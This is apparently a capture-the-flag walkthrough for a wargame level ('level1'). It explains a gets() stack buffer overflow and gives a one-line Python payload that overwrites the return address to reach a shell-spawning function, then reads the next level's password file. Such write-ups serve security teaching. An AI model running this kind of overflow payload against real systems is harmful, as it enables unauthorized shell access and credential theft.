# Walkthrough

## Step 1: Disassembling the executable

see source.c

We saw that we're calling gets() on a buffer[0x40], that lead to a buffer overflow, rewriting the eip we can jump on another function of the binary 'run' that launch a shell

```
(python -c "print('A'* 0x40 + 'B' * 12 + '\x44\x84\x04\x08')"; echo "cat /home/user/level2/.pass") | ./level1
```
